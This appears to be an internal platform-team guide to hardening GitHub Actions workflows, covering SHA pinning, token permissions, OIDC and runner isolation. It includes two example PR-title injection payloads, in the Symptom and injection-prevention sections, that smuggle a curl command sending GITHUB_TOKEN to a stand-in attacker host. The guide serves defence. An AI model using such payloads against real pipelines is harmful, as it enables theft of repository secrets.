# GitHub Actions Security Hardening — Pinning, Permissions, and Injection Prevention

**Date:** 2026-08-16
**Author:** the platform team
**Status:** published

## Symptom

Your CI pipeline uses `actions/checkout@v4` and 15 other third-party
actions referenced by mutable tags. A supply-chain attack compromises
one of those actions by force-pushing a malicious commit to the `v4`
tag — your next CI run exfiltrates repository secrets to an attacker-
controlled server. Separately, a contributor opens a PR with the title
`"; curl attacker.com/steal?t=$GITHUB_TOKEN #` and your workflow
interpolates the PR title directly into a `run:` block, giving the
attacker arbitrary command execution on your runner.

## Context

GitHub Actions is a primary target for supply-chain attacks. A 2026
survey found 71% of organizations never pin actions to SHA and use
mutable tags like `@v4` that attackers can rewrite. Hardening requires
defense-in-depth across five areas: dependency pinning, token
permissions, authentication, secret management, and runner isolation.
GitHub's 2026 security roadmap includes a workflow lockfile (analogous
to `go.sum`) for pinning all direct and transitive action dependencies.

## Pin actions by SHA

```yaml
# INSECURE: tag can be moved to point to malicious code
- uses: actions/checkout@v4

# SECURE: commit SHA is immutable
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1

# Finding the SHA:
#   1. Go to the action's releases page
#   2. Click the commit hash for the version you want
#   3. Copy the full 40-character SHA

# Tools for automated pinning:
#   step-security/secure-repo — auto-pins all actions in a repo
#   pin-github-action CLI — pins actions in workflow files
```

## Least-privilege GITHUB_TOKEN

```yaml
# Set default to no permissions at workflow level
permissions: {}

jobs:
  build:
    permissions:
      contents: read      # only what's needed
      packages: write     # only if publishing packages
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

  deploy:
    permissions:
      contents: read
      id-token: write     # required for OIDC
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions
          aws-region: us-east-1

# Organization setting:
#   Settings → Actions → General → Workflow permissions
#   → "Read repository contents and packages permissions"
```

## OIDC for cloud authentication

```yaml
# Replace long-lived secrets with short-lived OIDC tokens
permissions:
  id-token: write    # required for OIDC
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@<sha>
    with:
      role-to-assume: arn:aws:iam::123456789:role/github-actions
      aws-region: us-east-1
      # No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY needed
      # Token is short-lived, scoped to this workflow run
      # If compromised, expires in minutes

# Also works with GCP, Azure, HashiCorp Vault
# Configure trust policy to restrict to specific repos/branches
```

## Workflow injection prevention

```yaml
# INSECURE: untrusted input interpolated in run block
- name: Greet PR author
  run: echo "PR title: ${{ github.event.pull_request.title }}"
  # Attacker PR title: "; curl evil.com?t=$GITHUB_TOKEN #
  # → arbitrary command execution

# SECURE: use environment variable (shell-quoted)
- name: Greet PR author
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
  # Shell treats $PR_TITLE as a single string, not code

# Dangerous contexts (NEVER interpolate directly in run:):
#   github.event.pull_request.title
#   github.event.pull_request.body
#   github.event.issue.title
#   github.event.issue.body
#   github.event.comment.body
#   github.head_ref (branch name)
```

## Runner security

```
Self-hosted runner risks:
  → Never use on public repos (fork PRs can compromise runners)
  → Persistent runners retain state between jobs (malware persists)
  → Secrets cached on runner filesystem are accessible

Mitigations:
  → Use ephemeral/just-in-time runners (fresh per job, auto-delete)
  → Use GitHub-hosted runners for public repos
  → If self-hosted is required: network isolation, no secret caching
  → Monitor for unauthorized runner registration

2026 incident: Sysdig documented "Shai-Hulud" worm using rogue
self-hosted runners as backdoor channels across organizations.
```

## Anti-patterns

- **Using mutable tags** — 71% of organizations do this. Tags can
  be force-pushed to point to malicious code. Always pin by SHA.
- **Not setting permissions** — the default GITHUB_TOKEN gets broad
  read/write access. Always declare explicit permissions at workflow
  and job level.
- **Long-lived cloud credentials as secrets** — use OIDC for short-
  lived, scoped tokens instead of storing AWS/GCP keys as repository
  secrets.
- **Self-hosted runners on public repos** — this is the highest-risk
  configuration. Any fork PR contributor can run arbitrary code on
  your persistent infrastructure.

## Gotchas

- **pull_request_target trigger** — runs in the context of the base
  branch with access to secrets, but can check out untrusted PR code.
  If you checkout the PR head ref in a `pull_request_target` workflow,
  the attacker's code runs with your secrets.
- **Transitive action dependencies** — even if you pin your direct
  actions by SHA, they may pull in unpinned dependencies. Audit the
  full dependency tree, not just direct references.
- **ACTIONS_STEP_DEBUG** — if enabled, sensitive information may
  appear in logs. Never enable debug logging in production workflows
  that handle secrets.
- **Fork PR permissions** — workflows triggered by `pull_request`
  from a fork run with read-only permissions and no access to
  secrets (by design). Do not work around this with
  `pull_request_target` unless you understand the security model.

## Verification

- All actions are pinned by full SHA (not tags or branches).
- Workflow-level permissions are set to `{}` (no default access).
- Each job declares only the permissions it needs.
- Cloud authentication uses OIDC, not long-lived secrets.
- No untrusted inputs are interpolated directly in `run:` blocks.
- Self-hosted runners are ephemeral and not used on public repos.

## Related

- `documentation/docs/policies/github/code-scanning-codeql-custom-queries.md`
- `documentation/docs/policies/github/composite-actions-reusable-workflows.md`
- `documentation/docs/policies/security/supply-chain-security-slsa-sigstore.md`

## Source URLs (verified 2026-08-16)

- Hardening GitHub Actions: Lessons from Recent Attacks — https://www.wiz.io/blog/github-actions-security-guide
- GitHub Actions Security Checklist 2026: 25 Controls — https://www.stingrai.io/blog/github-actions-security-checklist
- Pinning GitHub Actions for Enhanced Security — https://www.stepsecurity.io/blog/pinning-github-actions-for-enhanced-security-a-complete-guide
- GitHub Actions Secure Use Reference — https://docs.github.com/en/actions/reference/security/secure-use
